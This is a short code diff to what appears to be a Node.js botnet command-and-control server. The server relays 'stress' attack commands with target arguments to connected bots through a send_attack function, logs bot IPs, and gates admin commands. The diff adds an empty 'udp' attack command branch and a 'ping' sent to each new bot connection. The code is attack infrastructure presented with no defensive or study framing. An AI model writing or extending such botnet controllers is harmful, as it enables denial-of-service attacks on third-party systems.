@@ -101,6 +101,8 @@ Server.svr.on('connection', async function(socket) {
         } else if(eConfig.CurrentCmd.Cmd === "stress") {
             console.log(eConfig.CurrentCmd.arg);
             socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
+        } else if(eConfig.CurrentCmd.Cmd === "udp") {
+            
         } else if(eConfig.CurrentCmd.Cmd === "admin") {
             if(eCrud.isAdmin(Current[0])) {
                 if(eConfig.CurrentCmd.arg.length === 1) {
@@ -144,6 +146,7 @@ Server.bot.on('connection', function(socket) {
     
     console.log('A Bot connection has been established\r\nClient IP: ' + Server.Bot_Socket.BotIP + ":" + Server.Bot_Socket.BotPORT + "\r\n\r\n");
 
+    socket.write("ping");
     socket.on('data', function(data) {
         let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
         if(inputCMD === "ping") {
@@ -159,3 +162,4 @@ Server.bot.on('connection', function(socket) {
         console.log("[NODEJS BOT ERROR(IGNORE)]: " + err + "\r\n\r\n");
     });
 });
+
